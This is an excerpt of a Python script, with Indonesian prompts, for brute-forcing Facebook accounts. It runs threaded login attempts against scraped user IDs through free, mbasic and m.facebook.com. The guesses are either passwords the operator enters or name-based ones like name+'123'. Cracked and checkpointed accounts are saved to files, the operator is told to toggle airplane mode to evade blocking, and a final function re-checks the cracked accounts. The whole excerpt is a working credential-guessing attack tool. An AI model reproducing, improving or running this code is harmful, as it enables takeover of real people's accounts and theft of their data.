...
def method():
	...
	if method == "":
		...
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as jaran:
				print("\n [*] contoh pass : sandi123,nama123")
				zzze = raw_input(" [?] set pass : ").split(",")
				if len(zzze) =="":
					exit(" [!] jangan kosong")
		...
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as jaran:
				...
				for user in id:
					uid, name = user.split("<=>")
					jaran.submit(crack, uid, zzze, "https:/free.facebook.com")
			exit("\n\n [#] crack selesai...")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=35) as jaran:
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				print(" [+] hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in id:
					...
					if len(name)>=6:
						...
						pwx = [ name+"123", name+"12345" ]
					jaran.submit(crack, uid, pwx, "https://free.facebook.com")
			exit("\n\n [#] crack selesai...")
	elif method == "3":
		ask = raw_input(" [?] gunakan password manual? y/t: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as jaran:
				...
				for user in id:
					uid, name = user.split("<=>")
					jaran.submit(crack, uid, zzze, "https://mbasic.facebook.com")
			exit("\n\n [#] crack selesai...")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=30) as jaran:
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				...
				for user in id:
					...
					if len(name)>=6:
						...
						pwx = [ name+"123", name+"12345" ]
					jaran.submit(crack, uid, pwx, "https://mbasic.facebook.com")
			exit("\n\n [#] crack selesai...")
	elif method == "4":
		ask = raw_input(" [?] gunakan password manual? y/t: ")
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as jaran:
				...
				for user in id:
					uid, name = user.split("<=>")
					jaran.submit(crack, uid, zzze, "https://m.facebook.com")
			exit("\n\n [#] crack selesai...")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=30) as jaran:
				print("\n [+] hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				...
				for user in id:
					...
					if len(name)>=6:
						...
						pwx = [ name+"123", name+"12345" ]
					jaran.submit(crack, uid, pwx, "https://m.facebook.com")
			exit("\n\n [#] crack selesai...")
		else:
			exit("\n [!] isi yang bener")
	else:
...
def ingfo():
	...
	for memek in buka_baju:
		zxc = memek.replace("\n","")
		titid  = zxc.split("|")
		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(zxc.replace("  * --> ","")))
		try:
